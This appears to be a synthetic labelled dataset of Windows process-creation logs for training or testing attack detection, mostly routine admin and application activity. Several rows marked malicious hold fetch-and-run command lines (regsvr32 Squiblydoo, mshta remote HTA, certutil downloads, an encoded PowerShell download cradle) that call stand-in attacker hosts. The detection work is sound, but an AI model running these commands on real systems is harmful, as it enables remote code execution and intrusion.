UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label
2024-07-04T06:14:08.158Z,{3BFB26F3-AFD9-4F3B-AC7A-18ABDAE25BF7},6057,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k DcomLaunch -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,20385,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-02T06:26:44.567Z,{C1CC3721-FD35-4D0A-8A14-FFFB3FE5F119},48319,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s wuauserv,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,61658,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-04T12:17:03.570Z,{6EF00C51-EDE6-4F6E-BB70-FA828F280670},63162,C:\Windows\System32\cmd.exe,cmd.exe /c net view \\fileserver,C:\Windows\explorer.exe,C:\Windows\explorer.exe,39775,CORP\klee,Medium,0,,,benign
2024-07-03T12:15:46.640Z,{AE143977-FC2C-4558-A4C9-912773A54384},33492,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Test-Connection -ComputerName fileserver -Count 4""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,39915,CORP\jsmith,Medium,0,,,benign
2024-07-02T10:29:24.276Z,{53276E61-CCE8-43BC-B724-E04B40FC4E4D},61646,C:\Program Files\Microsoft\Teams\current\Teams.exe,Teams.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",42943,CORP\mjones,Medium,0,,,benign
2024-07-02T08:47:30.942Z,{C1D66C2D-11EC-46D3-8B21-A8061065A54C},18601,C:\Users\admin\Downloads\installer.exe,installer.exe --silent --accept-license,C:\Windows\explorer.exe,C:\Windows\explorer.exe,59787,CORP\admin,High,0,,,benign
2024-07-03T15:21:27.835Z,{6ABB3463-ECDB-462C-B71E-8F340CFBABDF},54971,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Restart-Service -Name Spooler -Force""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,57328,CORP\agarwal,Medium,0,,,benign
2024-07-02T12:43:56.936Z,{223A95E5-4469-4D8A-B343-5EBDB1058E03},64266,C:\Windows\System32\mmc.exe,mmc.exe diskmgmt.msc,C:\Windows\explorer.exe,C:\Windows\explorer.exe,53102,CORP\itops,High,0,,,benign
2024-07-04T09:14:24.091Z,{B829FE9C-97E5-438E-9AD8-26D8217361B8},48891,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Import-Module ActiveDirectory; Get-ADComputer -Filter *""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,53819,CORP\mjones,Medium,0,,,benign
2024-07-03T17:51:07.815Z,{D1A12DA7-4B98-45B6-93AE-C51146B38DCF},65477,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",38088,CORP\klee,Medium,0,,,benign
2024-07-04T15:19:15.214Z,{44285EA9-8269-4938-95B8-7C99AB335C9E},37492,C:\Windows\System32\rundll32.exe,"rundll32.exe printui.dll,PrintUIEntry /in /n \\printserver\HP_LaserJet",C:\Windows\explorer.exe,C:\Windows\explorer.exe,4083,CORP\agarwal,Medium,0,,,gray_area
2024-07-01T16:16:56.550Z,{182563BA-2022-453A-AF7C-1D7C8F61E1D4},54290,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe https://sharepoint.corp.local/sites/team,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",52995,CORP\analyst01,Medium,0,,,benign
2024-07-03T13:43:10.178Z,{68986ADE-6754-431B-81FE-3845D1625F84},55260,C:\Windows\System32\rundll32.exe,"rundll32.exe shell32.dll,Control_RunDLL intl.cpl,,0",C:\Windows\explorer.exe,C:\Windows\explorer.exe,57325,CORP\analyst01,Medium,0,,,gray_area
2024-07-05T23:44:12.730Z,{FB18DF8C-FC76-436A-BFA5-F3E90B3E3BBD},21428,C:\Program Files\Microsoft\Teams\current\Teams.exe,Teams.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",27148,CORP\analyst02,Medium,0,,,benign
2024-07-02T19:45:04.013Z,{A6D6BCAF-09BE-439C-85D8-E90DAA128712},61962,C:\Windows\System32\taskeng.exe,taskeng.exe {GUID} S,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,61360,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-04T20:43:34.161Z,{3E388AC0-F873-497B-A2DF-1D259C036FAF},5840,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",29949,CORP\jsmith,Medium,0,,,benign
2024-07-03T06:48:10.510Z,{F3BA1703-9BE2-4C69-A36B-CEC4E9CE9013},34733,C:\Program Files\Windows Defender\MsMpEng.exe,"""C:\Program Files\Windows Defender\MsMpEng.exe""",C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,31593,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-04T22:57:23.469Z,{1D9BCCD3-5A64-40F7-B89B-88AE99D60204},64868,C:\Windows\SoftwareDistribution\Download\Install\update.exe,update.exe /quiet /norestart,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,50014,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T19:09:20.882Z,{7EE8E31B-B353-42E2-9C23-C3BF18E5D7F0},48078,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,21926,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-05T12:44:07.654Z,{FAEFD8CD-1B97-445A-844F-D5472E59CEA6},61039,C:\Windows\System32\cmd.exe,cmd.exe /c gpupdate /force,C:\Windows\explorer.exe,C:\Windows\explorer.exe,62645,CORP\admin,High,0,,,benign
2024-07-03T04:39:59.164Z,{0C9EA3D1-9DEB-43A0-BD5B-E8BB8D740F35},47649,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c runtime233.exe"")",C:\Windows\System32\cmd.exe,cmd.exe,36082,CORP\jsmith,Medium,1,T1218.011,Rundll32 JavaScript,malicious
2024-07-07T02:37:05.932Z,{9FFDACC5-CF89-4047-93D0-ED2CDC8C6D94},46088,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\installer100.csproj,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,5292,CORP\mjones,Medium,1,T1127.001,MSBuild Inline Task,malicious
2024-07-02T22:30:53.473Z,{58CAEF99-469C-4D05-B65A-7BF294EDF4B0},19295,C:\Windows\System32\regsvr32.exe,regsvr32 /s /n /u /i:http://cobaltstrike2794.xyz/payloads/file89.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,1950,CORP\klee,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious
2024-07-04T10:43:04.191Z,{3F8C6139-3A84-47C0-ACE7-88F658B7D88D},64076,C:\Windows\System32\mmc.exe,mmc.exe compmgmt.msc,C:\Windows\explorer.exe,C:\Windows\explorer.exe,12389,CORP\sysadmin,High,0,,,benign
2024-07-04T14:48:36.778Z,{5E7B05AF-EEBC-4FA7-83CE-8941411152DF},38976,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k LocalService -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,30419,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-02T15:32:48.516Z,{8EA3ADB0-B1B3-470C-BE91-646C7772B4F6},26234,C:\Windows\System32\certutil.exe,certutil.exe -hashfile C:\Downloads\patch.msi MD5,C:\Windows\System32\cmd.exe,cmd.exe,63217,CORP\itops,High,0,,,gray_area
2024-07-05T23:56:33.038Z,{219A7334-701C-4F79-A54F-180727C6779D},44380,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k LocalService -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,23070,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-03T13:47:26.179Z,{82D9F16B-A2FF-4503-8415-88598DE0C889},14159,C:\Windows\explorer.exe,explorer.exe C:\Users\mjones\Documents,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",9661,CORP\mjones,Medium,0,,,benign
2024-07-01T08:19:24.101Z,{D599296D-1835-482A-9359-87F61FCDF1E9},21974,C:\Windows\System32\schtasks.exe,schtasks.exe /query /fo TABLE /v,C:\Windows\System32\cmd.exe,cmd.exe,10336,CORP\admin,High,0,,,gray_area
2024-07-05T22:12:09.382Z,{DAEEDEBA-2626-4F52-827D-99B36E767C75},50971,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",11587,CORP\pchen,Medium,0,,,benign
2024-07-03T16:59:37.593Z,{C4C2AAE9-AC13-46EE-BDC1-A27CB8643F48},48186,C:\Windows\System32\cmd.exe,cmd.exe /c netstat -an,C:\Windows\explorer.exe,C:\Windows\explorer.exe,28366,CORP\jsmith,Medium,0,,,benign
2024-07-01T21:39:10.855Z,{F3BA2609-DA9F-4E72-BF25-67DE896DDFB4},39734,C:\Windows\System32\mshta.exe,"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"http://evil-payload7730.com/script249.hta"""""")",C:\Windows\explorer.exe,cmd.exe,5191,CORP\jsmith,Medium,1,T1218.005,Mshta Remote HTA,malicious
2024-07-05T11:29:00.794Z,{88E0AB9F-87D3-43EF-8C4F-8846516EA9CD},42813,C:\Windows\System32\taskeng.exe,taskeng.exe {GUID} S,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,34158,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-04T02:18:52.677Z,{4B0BCE42-EC11-4FDC-8178-C9596235F803},41965,C:\Windows\System32\wuauclt.exe,wuauclt.exe /detectnow /updatenow,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,40335,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-04T12:05:25.924Z,{AE46325B-92FC-4452-B50B-30856A33B848},56963,C:\Users\itops\Downloads\installer.exe,installer.exe --silent --accept-license,C:\Windows\explorer.exe,C:\Windows\explorer.exe,47812,CORP\itops,High,0,,,benign
2024-07-03T15:11:36.134Z,{183AB07E-64C6-48DA-B820-1958C7BB8865},65177,C:\Program Files\Mozilla Firefox\firefox.exe,firefox.exe -contentproc -childID 7,C:\Program Files\Mozilla Firefox\firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe""",38741,CORP\analyst02,Low,0,,,benign
2024-07-04T15:26:45.860Z,{03E7BD06-FABD-4A86-9EEE-19AE0F615C06},30088,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Content C:\Scripts\inventory.ps1 | Out-File C:\Reports\output.txt""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,33027,CORP\agarwal,Medium,0,,,benign
2024-07-01T15:46:44.463Z,{408B1B79-61D2-4D09-84B9-8B5191B1CAEA},21900,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ChildItem -Path C:\Logs -Recurse -Filter *.log""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,5402,CORP\itops,High,0,,,benign
2024-07-07T01:02:33.156Z,{C48406A0-3003-494B-BA06-4A7C4DF3013F},8716,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Restart-Service -Name W3SVC -Force""",C:\Windows\System32\cmd.exe,cmd.exe,25344,CORP\itops,High,0,,,gray_area
2024-07-02T00:44:24.366Z,{7A4DB6F3-1FD4-4D66-A060-136275F8283C},48474,C:\Windows\System32\taskeng.exe,taskeng.exe {GUID} S,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,9829,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-05T21:40:15.281Z,{B42B154B-14EA-408C-B891-6E66AE2CE66D},29827,C:\Program Files\Zoom\bin\Zoom.exe,Zoom.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",6077,CORP\pchen,Medium,0,,,benign
2024-07-04T20:27:44.980Z,{1BC27E93-9838-4364-8EEF-3775162EFF5C},48874,C:\Windows\System32\calc.exe,calc.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",52338,CORP\pchen,Medium,0,,,benign
2024-07-02T08:13:30.664Z,{C544F3D3-4C6C-4885-81E5-01D994F1A8E9},10512,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ADUser -Filter * -Properties LastLogonDate, Department, Title | Where-Object {$_.LastLogonDate -lt (Get-Date).AddDays(-90)} | Select Name, SamAccountName, LastLogonDate, Department | Export-Csv C:\Reports\stale_accounts.csv -NoTypeInformation""",C:\Windows\System32\cmd.exe,cmd.exe,43581,CORP\itops,High,0,,,gray_area
2024-07-02T10:30:51.009Z,{CCF58180-4390-4C54-8884-3F75D0059AD1},12574,C:\Program Files\Mozilla Firefox\firefox.exe,firefox.exe -contentproc -childID 7,C:\Program Files\Mozilla Firefox\firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe""",28624,CORP\klee,Low,0,,,benign
2024-07-01T09:25:26.036Z,{241E8649-D66D-45B2-ABB7-0A92B29D0AFD},37512,C:\Users\sysadmin\Downloads\installer.exe,installer.exe --silent --accept-license,C:\Windows\explorer.exe,C:\Windows\explorer.exe,36985,CORP\sysadmin,High,0,,,benign
2024-07-05T16:26:06.026Z,{C45BE81D-1A7C-4EAF-9F44-B06CB873E68B},6873,C:\Windows\System32\cmd.exe,cmd.exe /c tracert 8.8.8.8,C:\Windows\explorer.exe,C:\Windows\explorer.exe,24194,CORP\dbadmin,Medium,0,,,benign
2024-07-05T08:22:14.665Z,{93C8A2FA-EFAE-4C50-9541-F61B698C33AB},5496,C:\Program Files\Mozilla Firefox\firefox.exe,firefox.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",52198,CORP\helpdesk,Medium,0,,,benign
2024-07-05T21:17:02.706Z,{5D918368-83EF-4A8E-B55A-ED74A04074BB},25283,C:\Windows\System32\calc.exe,calc.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",15238,CORP\agarwal,Medium,0,,,benign
2024-07-05T09:11:31.038Z,{AAAE5574-7B05-4A38-A0F5-34480F986239},6915,C:\Windows\System32\UsoClient.exe,UsoClient.exe StartInteractiveScan,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,4681,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-01T01:19:10.720Z,{FAA8EA7D-69AB-4D71-90BB-21F600B0A7B9},31099,C:\Windows\System32\regsvr32.exe,regsvr32 /s /n /u /i:http://phish-host6672.xyz/payloads/file136.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,57224,CORP\mjones,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious
2024-07-04T12:46:01.405Z,{98397C20-32F4-4098-97D3-813B6D02FC2D},17676,C:\Windows\System32\cmd.exe,cmd.exe /c ping 8.8.8.8,C:\Windows\explorer.exe,C:\Windows\explorer.exe,54507,CORP\dbadmin,Medium,0,,,benign
2024-07-05T12:09:10.185Z,{A8004B06-5104-4EE6-A0CC-9E03BE3FEAEC},55483,C:\Program Files\Windows Defender\MsMpEng.exe,"""C:\Program Files\Windows Defender\MsMpEng.exe""",C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,46406,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-05T17:10:08.644Z,{AD3DA4B4-3213-4780-80AE-99B5892AEF1A},34596,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe C:\Users\mjones\Documents\report.pdf,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE""",3568,CORP\mjones,Medium,0,,,benign
2024-07-01T15:16:22.882Z,{9AF9D32F-C12A-42B0-80FC-B825430F14E9},54525,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Install-Module -Name Az -AllowClobber -Force""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,6700,CORP\sysadmin,High,0,,,benign
2024-07-01T21:08:51.475Z,{81201F3C-8DCD-46FD-B835-2DC8A61BD978},44750,C:\Program Files\Slack\Slack.exe,Slack.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",35808,CORP\klee,Medium,0,,,benign
2024-07-05T09:20:23.627Z,{5FA594C5-A411-476E-9D0C-1B4A874EF00F},57481,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --type=renderer --field-trial-handle=12345,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",18019,CORP\analyst02,Low,0,,,benign
2024-07-01T16:18:44.966Z,{8949336F-C682-48F3-B401-01448EB2B05F},9275,C:\Program Files\Slack\Slack.exe,Slack.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",42803,CORP\mjones,Medium,0,,,benign
2024-07-02T00:25:54.463Z,{D54B5E36-4E20-4E94-8B52-4182E5554144},37434,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s wuauserv,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,50026,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T11:14:08.754Z,{E6F82BBA-E81F-4737-98E6-7473CFFFAAD6},7717,C:\Program Files\Zoom\bin\Zoom.exe,Zoom.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",45348,CORP\agarwal,Medium,0,,,benign
2024-07-03T12:31:35.111Z,{737B4832-7CC3-4532-BF25-EA9EFF58F893},12519,C:\Windows\System32\resmon.exe,resmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,43306,CORP\sysadmin,High,0,,,benign
2024-07-03T08:59:04.700Z,{B791E779-43C5-44DD-A6F6-3E6EA3E4B72A},61659,C:\Windows\System32\cmd.exe,cmd.exe /c xcopy C:\Data D:\Backup /s /e,C:\Windows\explorer.exe,C:\Windows\explorer.exe,19374,CORP\helpdesk,Medium,0,,,benign
2024-07-03T04:32:45.962Z,{E71D576B-98D6-4130-998E-5A945BFF21B0},51527,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -split -f http://shadow-net7315.com/loader153.exe C:\Users\Public\core656.exe,C:\Windows\System32\cmd.exe,cmd.exe,33157,CORP\mjones,Medium,1,T1105,Certutil Download,malicious
2024-07-02T12:07:40.466Z,{21D35CD8-B426-4D9D-ABFB-F3BE2F4F6435},41483,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --type=renderer --field-trial-handle=12345,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",30672,CORP\mjones,Low,0,,,benign
2024-07-03T16:00:33.970Z,{DD687519-D27F-4EA6-A52A-043ED8415B7A},13521,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",6610,CORP\netadmin,Medium,0,,,benign
2024-07-02T15:50:44.972Z,{EDD97DA1-6178-415B-9B82-C6703C6D736E},11603,C:\Windows\System32\odbcad32.exe,odbcad32.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",7571,CORP\agarwal,Medium,0,,,benign
2024-07-04T09:01:37.069Z,{40B91772-512C-429E-9D63-528DD55F2147},1903,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Import-Module ActiveDirectory; Get-ADComputer -Filter *""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,18182,CORP\itops,High,0,,,benign
2024-07-05T09:29:23.688Z,{BD80E370-1CC9-49BE-AAD3-64FE79FB2C8B},50087,C:\Program Files\7-Zip\7zFM.exe,7zFM.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",45062,CORP\analyst02,Medium,0,,,benign
2024-07-04T14:45:12.077Z,{D199E32C-640A-4D65-84BB-4E0861846D4B},39803,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",46260,CORP\netadmin,Medium,0,,,benign
2024-07-02T21:35:10.271Z,{7C756EC3-4BEE-4BE5-B060-2E300B25F77F},35581,C:\Program Files\Mozilla Firefox\firefox.exe,firefox.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",58175,CORP\dbadmin,Medium,0,,,benign
2024-07-05T20:55:48.552Z,{31C330DB-6CBA-4575-BFAF-7D0CBDF60413},34262,C:\Windows\System32\mshta.exe,mshta.exe http://apt-infra4944.cc/script429.hta,C:\Windows\explorer.exe,cmd.exe,15370,CORP\pchen,Medium,1,T1218.005,Mshta Remote HTA,malicious
2024-07-05T15:10:35.198Z,{73C8DCB1-5F3B-48E6-B47B-D332021149E5},44243,C:\Windows\System32\wbem\WMIC.exe,"wmic.exe computersystem get model,manufacturer,totalphysicalmemory",C:\Windows\System32\cmd.exe,cmd.exe,49418,CORP\itops,High,0,,,gray_area
2024-07-06T04:02:50.675Z,{0EC60DAA-A7BA-45D6-9A17-5A61A036E63A},34651,C:\Windows\System32\cmd.exe,cmd.exe /c powershell -noni -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAJwApAA==,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"" /n document98.docm",39874,CORP\jsmith,Medium,1,T1204.002,Office Macro Execution,malicious
2024-07-03T01:48:52.118Z,{A706327E-9234-46B3-B243-AE3F81ED3F67},4442,C:\Windows\System32\certutil.exe,certutil  -urlcache -split -f http://cobaltstrike2535.ru/downloads/installer789.exe C:\Users\Public\installer244.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,11983,CORP\agarwal,Medium,1,T1105,Certutil Download,malicious
2024-07-03T12:28:51.136Z,{094F963D-8651-42BE-A6ED-2342584F0541},10055,C:\Users\sysadmin\Downloads\installer.exe,installer.exe --silent --accept-license,C:\Windows\explorer.exe,C:\Windows\explorer.exe,28049,CORP\sysadmin,High,0,,,benign
2024-07-03T18:38:05.904Z,{9F70CE47-881E-43B7-B580-58B39742C046},4447,C:\Windows\System32\lsass.exe,C:\Windows\System32\lsass.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,11196,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-04T13:52:36.075Z,{145A22A5-2FEF-4480-BD2D-9B5A0524EDE6},9213,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,64725,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-03T10:43:46.339Z,{1BE94E98-CD5A-4B04-8D91-0BFD7221E5D2},58533,C:\Windows\System32\eventvwr.exe,eventvwr.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,32454,CORP\sysadmin,High,0,,,benign
2024-07-03T08:31:08.199Z,{9E7F8E5A-2947-4607-846E-7F4B8E427340},54425,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Restart-Service -Name Spooler -Force""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,26162,CORP\jsmith,Medium,0,,,benign
2024-07-01T11:28:38.482Z,{47BB70F0-379F-49F0-98F3-59C7819BB494},57839,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe C:\Users\pchen\Documents\report.pdf,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE""",32566,CORP\pchen,Medium,0,,,benign
2024-07-01T01:53:49.227Z,{59626779-5150-42E7-B910-B723780F4050},9566,C:\Windows\System32\wuauclt.exe,wuauclt.exe /detectnow /updatenow,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,13984,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-04T10:57:38.552Z,{E262518E-3365-4C2B-96C5-9FDE16948351},55232,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe C:\Users\agarwal\Documents\report.pdf,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE""",1078,CORP\agarwal,Medium,0,,,benign
2024-07-05T11:43:29.719Z,{5209B923-CF2C-4E38-A747-E8E99AADC171},44597,C:\Windows\System32\conhost.exe,conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,28988,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-01T12:55:34.901Z,{2BEF53DA-1FB4-429F-9685-CCF8F136A352},23535,C:\Users\admin\Downloads\setup.exe,setup.exe /S /v/qn,C:\Windows\explorer.exe,C:\Windows\explorer.exe,58533,CORP\admin,High,0,,,benign
